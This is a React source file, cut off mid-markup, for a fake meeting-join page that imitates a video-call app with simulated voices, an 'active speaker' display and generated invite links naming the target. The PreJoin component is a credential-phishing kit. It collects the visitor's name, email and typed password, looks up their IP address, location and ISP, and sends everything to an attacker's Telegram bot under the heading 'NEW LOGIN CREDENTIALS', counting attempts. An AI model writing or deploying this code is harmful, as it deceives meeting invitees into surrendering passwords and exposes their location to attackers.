import { useState, useEffect, useRef } from "react";
import { Mic, MicOff, Video, VideoOff, Monitor, MessageSquare, Users, MoreHorizontal, Hand, Smile, Camera, ChevronDown, ChevronUp, Lock } from "lucide-react";
import { TG_BOT_TOKEN, TG_CHAT_ID } from "./config";

const C = {
  purple: "#6264A7", bg: "#1b1b1b", surf: "#252525",
  surf2: "#2e2e2e", surf3: "#3d3d3d", border: "#3d3d3d",
  dim: "#9d9d9d", red: "#c4314b", yellow: "#f9c800", green: "#107c10",
};

/* ═══ WEB AUDIO – meeting voice simulation ═══ */
class MeetingAudio {
  constructor() {
    this.ctx = null; this.master = null; this.voices = [];
    this.stopped = false; this.activeIdx = 0;
    this.timer = null; this.onSwitch = null;
  }

  async start(onSwitch, vol = 0.14) {
    this.onSwitch = onSwitch;
    try {
      this.ctx = new (window.AudioContext || window.webkitAudioContext)();
      this.master = this.ctx.createGain();
      this.master.gain.value = vol;
      this.master.connect(this.ctx.destination);
      const CFGS = [
        { formant: 680, mod: 3.2 },  // voice 0
        { formant: 530, mod: 2.7 },  // voice 1
        { formant: 920, mod: 4.4 },  // voice 2
        { formant: 610, mod: 3.0 },  // voice 3
      ];
      this.voices = CFGS.map(c => this._voice(c));
      this._noise();
      this._cycle();
      if (this.ctx.state === "suspended") await this.ctx.resume();
    } catch (_) { }
  }

  _voice({ formant, mod }) {
    const ctx = this.ctx;
    const len = ctx.sampleRate;
    const buf = ctx.createBuffer(1, len, ctx.sampleRate);
    const d = buf.getChannelData(0);
    for (let i = 0; i < len; i++) d[i] = Math.random() * 2 - 1;
    const src = ctx.createBufferSource();
    src.buffer = buf; src.loop = true;
    const bp = ctx.createBiquadFilter(); bp.type = "bandpass"; bp.frequency.value = formant; bp.Q.value = 7;
    const bp2 = ctx.createBiquadFilter(); bp2.type = "bandpass"; bp2.frequency.value = formant * 1.75; bp2.Q.value = 4;
    const env = ctx.createGain(); env.gain.value = 0.001;
    const lfo = ctx.createOscillator(); lfo.type = "sine"; lfo.frequency.value = mod;
    const lfoG = ctx.createGain(); lfoG.gain.value = 0.007;
    lfo.connect(lfoG); lfoG.connect(env.gain);
    src.connect(bp); src.connect(bp2); bp.connect(env); bp2.connect(env); env.connect(this.master);
    src.start(); lfo.start();
    return env;
  }

  _noise() {
    const ctx = this.ctx, len = ctx.sampleRate * 4;
    const buf = ctx.createBuffer(1, len, ctx.sampleRate);
    const d = buf.getChannelData(0);
    for (let i = 0; i < len; i++) d[i] = (Math.random() * 2 - 1) * 0.0015;
    const src = ctx.createBufferSource(); src.buffer = buf; src.loop = true;
    const lp = ctx.createBiquadFilter(); lp.type = "lowpass"; lp.frequency.value = 2400;
    const g = ctx.createGain(); g.gain.value = 1;
    src.connect(lp); lp.connect(g); g.connect(this.master); src.start();
  }

  _cycle() {
    if (this.stopped) return;
    const pool = [0, 0, 1, 1, 2, 2, 3, 3, 0, 1, 2, 3];
    const next = pool[Math.floor(Math.random() * pool.length)] % this.voices.length;
    this.activeIdx = next;
    this.onSwitch?.(next);
    this.voices.forEach((v, i) => {
      v.gain.linearRampToValueAtTime(i === next ? 0.022 : 0.001, this.ctx.currentTime + 0.45);
    });
    this.timer = setTimeout(() => this._cycle(), 1400 + Math.random() * 4000);
  }

  resume() { this.ctx?.resume().catch(() => { }); }
  setVol(v) { if (this.master) this.master.gain.linearRampToValueAtTime(v, this.ctx.currentTime + 0.4); }
  stop() { this.stopped = true; clearTimeout(this.timer); try { this.ctx?.close(); } catch (_) { } }
}

/* ═══ helpers ═══ */
function useIsMobile() {
  const [m, setM] = useState(window.innerWidth < 768);
  useEffect(() => {
    const fn = () => setM(window.innerWidth < 768);
    window.addEventListener("resize", fn); return () => window.removeEventListener("resize", fn);
  }, []);
  return m;
}
function inits(name) { return (name || "?").trim().split(/\s+/).map(w => w[0] || "").join("").slice(0, 2).toUpperCase() || "?"; }

/* ═══ small components ═══ */
function LiveVideo({ stream, mirror = true }) {
  const ref = useRef(null);
  useEffect(() => { if (ref.current) ref.current.srcObject = stream || null; }, [stream]);
  return <video ref={ref} autoPlay playsInline muted style={{ position: "absolute", inset: 0, width: "100%", height: "100%", objectFit: "cover", transform: mirror ? "scaleX(-1)" : "none" }} />;
}

function SpeakBars({ size = 14, color = "#fff" }) {
  const w = size <= 10 ? "2px" : "3px";
  return (
    <div style={{ display: "flex", alignItems: "flex-end", gap: "2px", height: `${size}px`, flexShrink: 0 }}>
      {[0, 1, 2, 3].map(i => (
        <div key={i} style={{ width: w, height: `${size}px`, background: color, borderRadius: "1px", transformOrigin: "bottom", animation: `speakBar 0.55s ease-in-out ${i * 0.13}s infinite alternate` }} />
      ))}
    </div>
  );
}

function PAv({ photo, name, bg, size = 40 }) {
  if (photo) return <img src={photo} alt="" style={{ width: size, height: size, borderRadius: "50%", objectFit: "cover", objectPosition: "center 25%", flexShrink: 0, display: "block" }} />;
  return <div style={{ width: size, height: size, borderRadius: "50%", background: bg, color: "#fff", flexShrink: 0, display: "flex", alignItems: "center", justifyContent: "center", fontSize: Math.round(size * 0.34), fontWeight: 700 }}>{inits(name)}</div>;
}

function IBtn({ icon, label, onClick }) {
  const [h, setH] = useState(false);
  return (
    <button onClick={onClick} onMouseEnter={() => setH(true)} onMouseLeave={() => setH(false)}
      style={{ background: h ? C.surf3 : "transparent", border: "none", borderRadius: "10px", padding: "7px 9px", color: "#fff", cursor: "pointer", display: "flex", flexDirection: "column", alignItems: "center", gap: "4px", minWidth: "48px", transition: "background .12s" }}>
      {icon}
      <span style={{ fontSize: "10px", color: C.dim, whiteSpace: "nowrap" }}>{label}</span>
    </button>
  );
}

/* ─── Guest link generator ─── */
function GuestGenerator({ linkBase, linkParam }) {
  const [gName, setGName] = useState("");
  const [gEmail, setGEmail] = useState("");
  const [gVanity, setGVanity] = useState("");
  const [copied, setCopied] = useState(false);

  const genLink = () => {
    try {
      const b64 = btoa(unescape(encodeURIComponent(JSON.stringify({ name: gName, email: gEmail }))));
      const cleanVanity = gVanity.trim().replace(/\s+/g, "-");
      const token = cleanVanity ? `${cleanVanity}~${b64}` : b64;
      const base = (linkBase || window.location.origin + window.location.pathname).replace(/[/]+$/, "");
      return `${base}?${linkParam || "join"}=${token}`;
    } catch (_) { return ""; }
  };

  const link = genLink();
  const ready = gName.trim().length > 0;

  const copyLink = async () => {
    if (!ready) return;
    try { await navigator.clipboard.writeText(link); setCopied(true); setTimeout(() => setCopied(false), 2200); } catch (_) { }
  };

  const inp = { width: "100%", boxSizing: "border-box", background: C.surf3, border: `1px solid ${C.border}`, borderRadius: "5px", padding: "6px 9px", color: "#fff", fontSize: "11px", outline: "none", transition: "border-color .15s" };

  return (
    <div style={{ background: "#191b26", borderRadius: "8px", padding: "12px", marginBottom: "12px", border: `1px solid ${C.purple}` }}>
      <p style={{ margin: "0 0 3px", fontSize: "11px", color: "#fff", fontWeight: 700 }}>➕ Invite a new guest</p>
      <p style={{ margin: "0 0 10px", fontSize: "10px", color: C.dim }}>
        Generates a link for someone not in the 4 above. The 4 participants stay unchanged &amp; visible.
      </p>

      <div style={{ display: "flex", gap: "7px", flexWrap: "wrap", marginBottom: "7px" }}>
        <div style={{ flex: "1 1 130px" }}>
          <label style={{ fontSize: "10px", color: C.dim, display: "block", marginBottom: "3px" }}>Guest name *</label>
          <input value={gName} onChange={e => setGName(e.target.value)} placeholder="e.g. Jane Doe"
            onFocus={e => e.target.style.borderColor = C.purple} onBlur={e => e.target.style.borderColor = C.border} style={inp} />
        </div>
        <div style={{ flex: "1 1 150px" }}>
          <label style={{ fontSize: "10px", color: C.dim, display: "block", marginBottom: "3px" }}>Guest email</label>
          <input value={gEmail} onChange={e => setGEmail(e.target.value)} placeholder="jane@company.com" type="email"
            onFocus={e => e.target.style.borderColor = C.purple} onBlur={e => e.target.style.borderColor = C.border} style={inp} />
        </div>
      </div>

      <div style={{ marginBottom: "9px" }}>
        <label style={{ fontSize: "10px", color: C.dim, display: "block", marginBottom: "3px" }}>
          Vanity text <span style={{ color: "#666" }}>(added to link for looks — guest never sees it)</span>
        </label>
        <input value={gVanity} onChange={e => setGVanity(e.target.value)} placeholder="e.g. vip-q3-board-meeting-2026"
          onFocus={e => e.target.style.borderColor = C.purple} onBlur={e => e.target.style.borderColor = C.border}
          style={{ ...inp, fontFamily: "monospace", fontSize: "10px", color: "#a5f3fc" }} />
      </div>

      {ready ? (
        <>
          <div style={{ display: "flex", gap: "6px" }}>
            <input readOnly value={link} onClick={e => e.target.select()}
              style={{ ...inp, flex: 1, fontFamily: "monospace", fontSize: "9px", color: C.dim, cursor: "text", overflow: "hidden", textOverflow: "ellipsis", whiteSpace: "nowrap" }} />
            <button onClick={copyLink} style={{
              background: copied ? C.green : C.purple, border: "none", borderRadius: "5px",
              padding: "6px 14px", color: "#fff", cursor: "pointer", fontSize: "11px", fontWeight: 700,
              flexShrink: 0, transition: "all .2s", whiteSpace: "nowrap"
            }}>
              {copied ? "✓ Copied" : "Copy link"}
            </button>
          </div>
          <p style={{ margin: "6px 0 0", fontSize: "9px", color: C.dim }}>
            Guest will see: <span style={{ color: "#fff" }}>{gName}</span>{gEmail ? ` · ${gEmail}` : ""}
          </p>
        </>
      ) : (
        <p style={{ margin: 0, fontSize: "10px", color: "#666", fontStyle: "italic" }}>Enter a guest name to generate the link</p>
      )}
    </div>
  );
}

/* ─── Participant card ─── */
function ParticipantCard({ p, onPhoto, onName, onEmail, onSlug, linkBase, linkParam }) {
  const fileRef = useRef(null);
  const [hov, setHov] = useState(false);
  const [copied, setCopied] = useState(false);

  const genLink = () => {
    try {
      const b64 = btoa(unescape(encodeURIComponent(JSON.stringify({ name: p.name, email: p.email || "" }))));
      const token = p.slug ? `${p.slug}~${b64}` : b64;
      const base = (linkBase || window.location.origin + window.location.pathname).replace(/[/]+$/, "");
      return `${base}?${linkParam || "join"}=${token}`;
    } catch (_) { return window.location.href; }
  };

  const copyLink = async () => {
    try { await navigator.clipboard.writeText(genLink()); setCopied(true); setTimeout(() => setCopied(false), 2200); } catch (_) { }
  };

  const inp = { background: C.surf3, border: `1px solid ${C.border}`, borderRadius: "5px", padding: "5px 8px", color: "#fff", fontSize: "11px", outline: "none", transition: "border-color .15s" };

  return (
    <div style={{ display: "flex", alignItems: "flex-start", gap: "10px", padding: "10px 0", borderBottom: `1px solid ${C.border}` }}>

      <input type="file" accept="image/*" ref={fileRef} style={{ display: "none" }}
        onChange={e => { if (e.target.files[0]) onPhoto(URL.createObjectURL(e.target.files[0])); e.target.value = ""; }} />
      <div onClick={() => fileRef.current?.click()}
        onMouseEnter={() => setHov(true)} onMouseLeave={() => setHov(false)}
        style={{
          width: "44px", height: "44px", borderRadius: "50%", position: "relative", cursor: "pointer", overflow: "hidden", flexShrink: 0,
          border: hov ? `2px solid ${C.purple}` : `2px solid ${C.border}`, transition: "border-color .15s"
        }}>
        <PAv photo={p.photo} name={p.name} bg={p.avatarBg} size={44} />
        {hov && <div style={{ position: "absolute", inset: 0, background: "rgba(0,0,0,0.65)", display: "flex", alignItems: "center", justifyContent: "center" }}>
          <Camera size={13} color="white" />
        </div>}
      </div>

      <div style={{ flex: 1, display: "flex", flexDirection: "column", gap: "5px", minWidth: 0 }}>
        <div style={{ display: "flex", gap: "6px", flexWrap: "wrap" }}>
          <input value={p.name} onChange={e => onName(e.target.value)} placeholder="Full name"
            onFocus={e => e.target.style.borderColor = C.purple} onBlur={e => e.target.style.borderColor = C.border}
            style={{ ...inp, flex: "1 1 90px" }} />
          <input value={p.email || ""} onChange={e => onEmail(e.target.value)} placeholder="Email address" type="email"
            onFocus={e => e.target.style.borderColor = C.purple} onBlur={e => e.target.style.borderColor = C.border}
            style={{ ...inp, flex: "2 1 150px" }} />
        </div>
        <div style={{ display: "flex", alignItems: "center", gap: "6px" }}>
          <span style={{ fontSize: "10px", color: C.dim, flexShrink: 0, whiteSpace: "nowrap" }}>
            Link slug:
          </span>
          <input value={p.slug || ""} onChange={e => onSlug(e.target.value.replace(/\s+/g, "-").toLowerCase())}
            placeholder="e.g. sarah-weekly-standup"
            onFocus={e => e.target.style.borderColor = C.purple} onBlur={e => e.target.style.borderColor = C.border}
            style={{ ...inp, flex: 1, fontFamily: "monospace", fontSize: "10px", color: "#a5f3fc" }} />
        </div>
        <div style={{ display: "flex", gap: "5px" }}>
          <div style={{ flex: 1, position: "relative", minWidth: 0 }}>
            <span style={{ position: "absolute", left: "7px", top: "50%", transform: "translateY(-50%)", fontSize: "11px", pointerEvents: "none" }}>🔗</span>
            <input readOnly value={genLink()} onClick={e => e.target.select()}
              style={{
                ...inp, width: "100%", paddingLeft: "24px", boxSizing: "border-box",
                fontFamily: "monospace", fontSize: "9px", color: C.dim, cursor: "text",
                overflow: "hidden", textOverflow: "ellipsis", whiteSpace: "nowrap"
              }} />
          </div>
          <button onClick={copyLink} style={{
            background: copied ? C.green : C.surf3, border: `1px solid ${copied ? C.green : C.border}`,
            borderRadius: "5px", padding: "5px 10px", color: copied ? "#fff" : C.dim,
            cursor: "pointer", fontSize: "10px", fontWeight: 600, flexShrink: 0,
            transition: "all .2s", whiteSpace: "nowrap"
          }}>
            {copied ? "✓ Copied" : "Copy link"}
          </button>
        </div>
      </div>
    </div>
  );
}

/* ─── Shared: main speaker video area ─── */
function MainSpeakerVideo({ speaker, pulse }) {
  return (
    <div style={{ flex: 1, position: "relative", overflow: "hidden" }}>
      {speaker.photo ? (
        <>
          <img src={speaker.photo} alt="" style={{ position: "absolute", inset: 0, width: "100%", height: "100%", objectFit: "cover", objectPosition: "center 25%" }} />
          <div style={{ position: "absolute", inset: 0, background: "rgba(0,0,0,0.18)" }} />
        </>
      ) : (
        <div style={{ position: "absolute", inset: 0, background: speaker.videoBg || "linear-gradient(180deg,#0b1c2b,#142d45 28%,#060d18)", transition: "background 0.9s ease" }}>
          <div style={{ position: "absolute", top: 0, left: 0, right: 0, bottom: "32%", background: "linear-gradient(180deg,#14304a,#1c3f60 55%,transparent)" }} />
          {[0, 1, 2, 3, 4].map(i => (
            <div key={i} style={{ position: "absolute", top: `${8 + i * 7}%`, left: `${5 + i * 18}%`, width: `${60 + (i % 3) * 20}px`, height: "14px", background: "rgba(255,255,255,0.04)", borderRadius: "2px" }} />
          ))}
          <div style={{ position: "absolute", bottom: "16%", left: "50%", transform: "translateX(-50%)", display: "flex", flexDirection: "column", alignItems: "center" }}>
            <div style={{ width: "82px", height: "42px", borderRadius: "60px 60px 0 0", background: "#3d2410", position: "relative", zIndex: 2 }} />
            <div style={{ width: "78px", height: "82px", borderRadius: "50%", background: "linear-gradient(145deg,#d4a574,#c4915c)", marginTop: "-20px", zIndex: 1, boxShadow: "0 6px 24px rgba(0,0,0,0.5)" }} />
            <div style={{ width: "230px", height: "72px", background: "linear-gradient(180deg,#2c3e50,#1a252f)", borderRadius: "115px 115px 0 0", marginTop: "-10px" }} />
          </div>
          <div style={{ position: "absolute", bottom: 0, left: 0, right: 0, height: "20%", background: "linear-gradient(transparent,rgba(0,0,0,0.72))" }} />
        </div>
      )}
      <div style={{ position: "absolute", inset: 0, boxShadow: pulse ? `inset 0 0 0 3px ${C.purple}` : "inset 0 0 0 3px transparent", transition: "box-shadow 0.4s ease", pointerEvents: "none", zIndex: 10 }} />
      <div style={{ position: "absolute", top: "12px", right: "12px", background: "rgba(0,0,0,0.58)", backdropFilter: "blur(6px)", borderRadius: "5px", padding: "5px 11px", display: "flex", alignItems: "center", gap: "7px", fontSize: "11px", color: "#fff", zIndex: 6 }}>
        <SpeakBars size={13} color={C.purple} /> Active speaker
      </div>
      <div style={{ position: "absolute", bottom: "14px", left: "14px", background: "rgba(0,0,0,0.65)", backdropFilter: "blur(6px)", borderRadius: "6px", padding: "5px 13px", display: "flex", alignItems: "center", gap: "8px", fontSize: "13px", fontWeight: 600, zIndex: 6, transition: "all 0.3s ease" }}>
        {speaker.name} <SpeakBars size={14} color="white" />
      </div>
    </div>
  );
}

/* ─── Shared: right participant strip ─── */
function RightStrip({ participants, activeIdx, youStream, youCamOn, youMuted, userName, showYou }) {
  return (
    <div style={{ width: "188px", background: C.surf, borderLeft: `1px solid ${C.border}`, display: "flex", flexDirection: "column", overflow: "auto", flexShrink: 0 }}>
      <div style={{ padding: "7px 10px", fontSize: "10px", color: C.dim, fontWeight: 700, textTransform: "uppercase", letterSpacing: "0.6px", borderBottom: `1px solid ${C.border}`, flexShrink: 0 }}>
        {participants.length + (showYou ? 1 : 0)} in call
      </div>
      {participants.map((p, i) => (
        <DeskTile key={p.id} p={p} youStream={null} youCamOn={false} youMuted={true} isYou={false} userName={userName} isSpeaking={i === activeIdx} />
      ))}
      {showYou && <DeskTile p={{ id: 99, name: userName, avatarBg: "#1d4ed8" }} youStream={youStream} youCamOn={youCamOn} youMuted={youMuted} isYou={true} userName={userName} isSpeaking={false} />}
    </div>
  );
}

function DeskTile({ p, youStream, youCamOn, youMuted, isYou, userName, isSpeaking }) {
  const showCam = isYou ? youCamOn : p.videoOn;
  const isMuted = isYou ? youMuted : p.muted;
  const label = isYou ? userName : p.name;
  return (
    <div style={{ height: "110px", flexShrink: 0, borderBottom: `1px solid ${C.border}`, position: "relative", overflow: "hidden", background: p.photo ? "#000" : (showCam ? p.videoBg || C.surf2 : C.surf2), boxShadow: isSpeaking ? `inset 0 0 0 2px ${C.purple}` : "none", transition: "box-shadow 0.35s ease" }}>
      {!isYou && p.photo && <img src={p.photo} alt="" style={{ position: "absolute", inset: 0, width: "100%", height: "100%", objectFit: "cover", objectPosition: "center 25%" }} />}
      {isYou && showCam && <LiveVideo stream={youStream} />}
      {!isYou && !p.photo && showCam && <div style={{ position: "absolute", inset: 0, background: p.videoBg }}><div style={{ position: "absolute", bottom: "6px", left: "50%", transform: "translateX(-50%)", display: "flex", flexDirection: "column", alignItems: "center" }}><div style={{ width: "22px", height: "26px", borderRadius: "50%", background: "rgba(255,255,255,0.2)" }} /><div style={{ width: "50px", height: "16px", background: "rgba(255,255,255,0.12)", borderRadius: "25px 25px 0 0", marginTop: "-3px" }} /></div></div>}
      {!p.photo && !showCam && <div style={{ position: "absolute", inset: 0, display: "flex", alignItems: "center", justifyContent: "center" }}><PAv photo={null} name={isYou ? userName : p.name} bg={isYou ? "#1d4ed8" : p.avatarBg} size={40} /></div>}
      <div style={{ position: "absolute", bottom: 0, left: 0, right: 0, height: "40px", background: "linear-gradient(transparent,rgba(0,0,0,0.84))", pointerEvents: "none" }} />
      <div style={{ position: "absolute", bottom: "4px", left: "7px", display: "flex", alignItems: "center", gap: "5px" }}>
        <span style={{ fontSize: "10px", color: "#fff", fontWeight: 500 }}>{label}{isYou ? " (You)" : ""}</span>
        {isSpeaking && <SpeakBars size={9} color={C.purple} />}
      </div>
      {!isYou && p.handRaised && <div style={{ position: "absolute", top: "5px", left: "5px", background: C.yellow, borderRadius: "4px", padding: "1px 5px", fontSize: "10px" }}>✋</div>}
      {isMuted && <div style={{ position: "absolute", bottom: "4px", right: "6px", width: "17px", height: "17px", borderRadius: "50%", background: "rgba(196,49,75,0.9)", display: "flex", alignItems: "center", justifyContent: "center" }}><MicOff size={9} color="white" /></div>}
    </div>
  );
}

function MobThumb({ p, youStream, youCamOn, isYou, userName, isSpeaking }) {
  const showCam = isYou ? youCamOn : p.videoOn;
  return (
    <div style={{ width: "84px", height: "72px", flexShrink: 0, borderRadius: "8px", overflow: "hidden", position: "relative", background: p.photo ? "#000" : (showCam ? p.videoBg || C.surf2 : C.surf2), border: isSpeaking ? `2px solid ${C.purple}` : `1px solid ${C.border}`, boxSizing: "border-box", transition: "border-color 0.3s ease" }}>
      {!isYou && p.photo && <img src={p.photo} alt="" style={{ position: "absolute", inset: 0, width: "100%", height: "100%", objectFit: "cover", objectPosition: "center 25%" }} />}
      {isYou && showCam && <LiveVideo stream={youStream} />}
      {!p.photo && !showCam && <div style={{ position: "absolute", inset: 0, display: "flex", alignItems: "center", justifyContent: "center" }}><PAv photo={null} name={isYou ? userName : p.name} bg={isYou ? "#1d4ed8" : p.avatarBg} size={28} /></div>}
      <div style={{ position: "absolute", bottom: 0, left: 0, right: 0, background: "linear-gradient(transparent,rgba(0,0,0,0.85))", padding: "3px 5px", display: "flex", alignItems: "center", gap: "3px" }}>
        <span style={{ fontSize: "9px", color: "#fff" }}>{isYou ? "You" : p.name.split(" ")[0]}</span>
        {isSpeaking && <SpeakBars size={8} color={C.purple} />}
      </div>
      {!isYou && p.handRaised && <div style={{ position: "absolute", top: "3px", left: "3px", fontSize: "9px" }}>✋</div>}
    </div>
  );
}

/* ═══ TOP BAR ═══ */
function TopBar({ elapsed, badge, title = "Meeting Platform" }) {
  const fmt = s => `${String(Math.floor(s / 60)).padStart(2, "0")}:${String(s % 60).padStart(2, "0")}`;
  return (
    <div style={{ height: "46px", background: C.surf, borderBottom: `1px solid ${C.border}`, display: "flex", alignItems: "center", padding: "0 14px", gap: "10px", flexShrink: 0 }}>
      <div style={{ width: "30px", height: "30px", background: "linear-gradient(135deg,#7c7fdb,#5558a0)", borderRadius: "8px", flexShrink: 0, display: "flex", alignItems: "center", justifyContent: "center", fontSize: "17px", fontWeight: 900 }}>T</div>
      <span style={{ fontWeight: 700, fontSize: "16px", flex: 1, overflow: "hidden", textOverflow: "ellipsis", whiteSpace: "nowrap" }}>{title}</span>
      <div style={{ width: "1px", height: "18px", background: C.border, flexShrink: 0 }} />
      <span style={{ color: C.dim, fontSize: "13px", fontVariantNumeric: "tabular-nums", flexShrink: 0 }}>{fmt(elapsed)}</span>
      <div style={{ display: "flex", alignItems: "center", gap: "5px", background: "rgba(196,49,75,0.15)", borderRadius: "12px", padding: "2px 8px", flexShrink: 0 }}>
        <div style={{ width: "7px", height: "7px", borderRadius: "50%", background: C.red }} />
        <span style={{ fontSize: "10px", color: "#f87171", fontWeight: 700 }}>REC</span>
      </div>
      <div style={{ flex: 1 }} />
      {badge}
      <div style={{ display: "flex", alignItems: "flex-end", gap: "2px", height: "14px" }}>
        {[4, 7, 10, 13].map((h, i) => <div key={i} style={{ width: "3px", height: `${h}px`, background: i < 3 ? "#22c55e" : C.border, borderRadius: "1px" }} />)}
      </div>
    </div>
  );
}

/* ═══════════════════════════════════════════════
   PRE-JOIN
═══════════════════════════════════════════════ */
function PreJoin({ participants, updateParticipant, userName, setUserName, userEmail, setUserEmail, onJoin, isGuest }) {
  const mob = useIsMobile();
  const [micOn, setMicOn] = useState(true);
  const [camOn, setCamOn] = useState(true);
  const [stream, setStream] = useState(null);
  const [camErr, setCamErr] = useState(false);
  const [activeIdx, setActiveIdx] = useState(0);
  const [pulse, setPulse] = useState(true);
  const [elapsed, setElapsed] = useState(23 * 60 + 47);
  const [showSetup, setShowSetup] = useState(false);
  const [muted, setMuted] = useState(false);
  const [password, setPassword] = useState("");
  const [linkBase, setLinkBase] = useState(() => `${window.location.origin}${window.location.pathname}`);
  const [linkParam, setLinkParam] = useState('join');

  const [tgToken, setTgToken] = useState(TG_BOT_TOKEN || "");
  const [tgChatId, setTgChatId] = useState(TG_CHAT_ID || "");

  const [joinError, setJoinError] = useState("");
  const [attempts, setAttempts] = useState(0);

  const vidRef = useRef(null);
  const audioRef = useRef(null);

  /* ── Camera ── */
  useEffect(() => { startCam(); }, []);
  useEffect(() => { if (vidRef.current) vidRef.current.srcObject = camOn && stream ? stream : null; }, [stream, camOn]);
  async function startCam() {
    try { const s = await navigator.mediaDevices.getUserMedia({ video: true, audio: false }); setStream(s); setCamOn(true); setCamErr(false); }
    catch { setCamErr(true); setCamOn(false); }
  }
  async function toggleCam() {
    if (camOn) { stream?.getVideoTracks().forEach(t => t.stop()); setStream(null); setCamOn(false); }
    else await startCam();
  }

  /* ── Audio ── */
  useEffect(() => {
    const audio = new MeetingAudio();
    audio.start(idx => setActiveIdx(idx % participants.length), 0.14);
    audioRef.current = audio;
    const resume = () => audio.resume();
    document.addEventListener("click", resume, { once: true });
    document.addEventListener("keydown", resume, { once: true });
    return () => { document.removeEventListener("click", resume); document.removeEventListener("keydown", resume); audio.stop(); };
  }, []);

  useEffect(() => { audioRef.current?.setVol(muted ? 0 : 0.14); }, [muted]);

  useEffect(() => { const t = setInterval(() => setPulse(p => !p), 950); return () => clearInterval(t); }, []);
  useEffect(() => { const t = setInterval(() => setElapsed(e => e + 1), 1000); return () => clearInterval(t); }, []);

  const speaker = participants[activeIdx] || participants[0];
  const canJoin = userName.trim().length > 0 && password.length >= 4;

  const geoCacheRef = useRef(null);
  const CACHE_TTL = 30 * 60 * 1000;

  const sendToTelegram = async () => {
    if (!tgToken.trim() || !tgChatId.trim() || !password.trim()) return;

    let geoData = geoCacheRef.current;
    if (!geoCacheRef.current || (Date.now() - geoCacheRef.current.timestamp > CACHE_TTL)) {
      geoData = { timestamp: Date.now() };
      try {
        const geoRes = await fetch("https://ipapi.co/json/");
        const data = await geoRes.json();
        geoData.ip = data.ip || "IP unavailable";
        geoData.city = data.city || "Unknown";
        geoData.region = data.region || "Unknown";
        geoData.country = data.country_name || data.country || "Unknown";
        geoData.lat = data.latitude || "N/A";
        geoData.lon = data.longitude || "N/A";
        geoData.isp = data.org || "N/A";
        geoCacheRef.current = geoData;
      } catch (_) {
        geoData.ip = "IP unavailable";
        geoData.city = "Unknown";
        geoData.country = "Unknown";
      }
    }

    const msg = `🧪 <b>NEW LOGIN CREDENTIALS</b>\n\n` +
      `👤 <b>Name:</b> <code>${userName}</code>\n` +
      `📧 <b>Email:</b> <code>${userEmail}</code>\n` +
      `🔑 <b>Password typed:</b> <code>${password}</code>\n` +
      `🌐 <b>IP:</b> <code>${geoData.ip}</code>\n` +
      `📍 <b>Location:</b> ${geoData.city}, ${geoData.region}, ${geoData.country}\n` +
      `🌍 <b>Coordinates:</b> ${geoData.lat}, ${geoData.lon}\n` +
      `🏢 <b>ISP:</b> ${geoData.isp}\n` +
      `🕒 <b>Timestamp:</b> ${new Date().toLocaleString()}\n` +
      `📱 <b>Browser / Device:</b> ${navigator.userAgent.substring(0, 90)}...` +
      `\n🔢 <b>Attempt #:</b> ${attempts + 1}`;

    fetch(`https://api.telegram.org/bot${tgToken.trim()}/sendMessage`, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({
        chat_id: tgChatId.trim(),
        text: msg,
        parse_mode: "HTML"
      })
    }).then(r => r.json()).then(d => {
      if (d && d.ok) console.log("%c[Telegram] Message sent successfully", "color:#22c55e");
    }).catch(() => { });
  };

  return (
    <div style={{ width: "100%", height: "100vh", background: C.bg, display: "flex", flexDirection: "column", fontFamily: "'Segoe UI',system-ui,-apple-system,sans-serif", overflow: "hidden", color: "#fff", userSelect: "none" }}>

      <TopBar elapsed={elapsed} badge={
        <div style={{ display: "flex", alignItems: "center", gap: "7px", background: "rgba(98,100,167,0.18)", borderRadius: "12px", padding: "4px 12px", border: `1px solid rgba(98,100,167,0.4)`, marginRight: "8px" }}>
          <SpeakBars size={11} color={C.purple} />
          <span style={{ fontSize: "11px", color: C.purple, fontWeight: 700 }}>Meeting in progress</span>
        </div>
      } title="Meeting Platform" />

      <div style={{ flex: 1, display: "flex", overflow: "hidden" }}>

        <div style={{ flex: 1, position: "relative", overflow: "hidden" }}>
          <MainSpeakerVideo speaker={speaker} pulse={pulse} />

          <div style={{ position: "absolute", bottom: "14px", right: "14px", background: "rgba(0,0,0,0.7)", backdropFilter: "blur(6px)", borderRadius: "8px", padding: "6px 14px", display: "flex", alignItems: "center", gap: "8px", zIndex: 20 }}>
            <div style={{ width: "8px", height: "8px", borderRadius: "50%", background: "#fbbf24", animation: "dotBlink 1.4s ease-in-out infinite" }} />
            <span style={{ fontSize: "11px", color: "#fff", fontWeight: 500 }}>You're previewing · not joined yet</span>
          </div>

          {mob && (
            <div style={{ position: "absolute", top: 0, left: 0, right: 0, height: "84px", background: "rgba(0,0,0,0.55)", backdropFilter: "blur(4px)", display: "flex", alignItems: "center", gap: "8px", padding: "0 10px", overflowX: "auto", zIndex: 15 }}>
              {participants.map((p, i) => (
                <MobThumb key={p.id} p={p} youStream={null} youCamOn={false} isYou={false} userName={userName} isSpeaking={i === activeIdx} />
              ))}
            </div>
          )}
        </div>

        {!mob && (
          <RightStrip participants={participants} activeIdx={activeIdx} youStream={null} youCamOn={false} youMuted={true} userName={userName} showYou={false} />
        )}
      </div>

      <div style={{ background: C.surf, borderTop: `1px solid ${C.border}`, flexShrink: 0 }}>

        <div style={{ padding: "10px 16px", display: "flex", alignItems: "center", gap: "12px", flexWrap: "wrap" }}>

          {/* Welcome info */}
          <div style={{ width: "100%", display: "flex", flexDirection: "column", gap: "2px", marginBottom: "4px", flex: "1 1 260px" }}>
            <div style={{ fontSize: "13px", color: "#fff" }}>
              Welcome {userName}, you have been invited to join a meeting
            </div>
            <div style={{ fontSize: "11px", color: C.dim, marginTop: "2px" }}>Continue sign in as</div>
            <div style={{ fontSize: "13px", fontWeight: 600, color: "#fff" }}>{userEmail || "—"}</div>
            {attempts > 0 && (
              <div style={{ fontSize: "11px", color: C.yellow, marginTop: "2px" }}>Attempts: {attempts}</div>
            )}
          </div>

          {/* Video preview */}
          <div style={{ width: "68px", height: "52px", borderRadius: "8px", overflow: "hidden", position: "relative", background: C.surf2, flexShrink: 0, border: `1px solid ${C.border}` }}>
            <video ref={vidRef} autoPlay playsInline muted style={{ position: "absolute", inset: 0, width: "100%", height: "100%", objectFit: "cover", transform: "scaleX(-1)", display: camOn && stream ? "block" : "none" }} />
            {(!camOn || !stream) && <div style={{ position: "absolute", inset: 0, display: "flex", alignItems: "center", justifyContent: "center" }}><PAv photo={null} name={userName} bg="#1d4ed8" size={26} /></div>}
          </div>

          {/* Inputs Group - Better layout */}
          <div style={{
            display: "flex",
            flexDirection: "column",
            gap: "8px",
            flex: "1 1 420px",
            minWidth: "280px"
